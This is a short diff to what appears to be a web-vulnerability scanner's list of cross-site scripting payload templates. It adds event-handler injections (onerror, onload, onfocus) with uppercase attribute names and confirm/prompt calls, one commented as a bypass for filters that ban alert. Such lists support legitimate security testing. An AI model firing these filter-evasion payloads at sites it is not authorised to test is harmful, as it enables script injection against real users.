@@ -5,6 +5,17 @@
 HTML_BODY = [
     "<img src=x onerror=alert('{marker}')>",
     "<svg onload=alert('{marker}')>",
+    "<img src=x ONERROR={marker}>",
+    "<svg ONLOAD={marker}>",
+    # alert-ban bypass: use confirm/prompt (w1c)
+    "<img src=x onerror=confirm('{marker}')>",
+    "<svg onload=confirm('{marker}')>",
+    # More uppercase + confirm combinations
+    "<img src=x ONERROR=confirm({marker})>",
+    "<body ONLOAD=alert('{marker}')>",
+    "<input autofocus ONFOCUS=alert('{marker}')>",
+    # More confirm/prompt variants
+    "<img src=x onerror=prompt('{marker}')>",
     "<details open ontoggle=alert('{marker}')>",
     "<iframe srcdoc=\"<script>alert('{marker}')</script>\">",
     "<body onload=alert('{marker}')>",
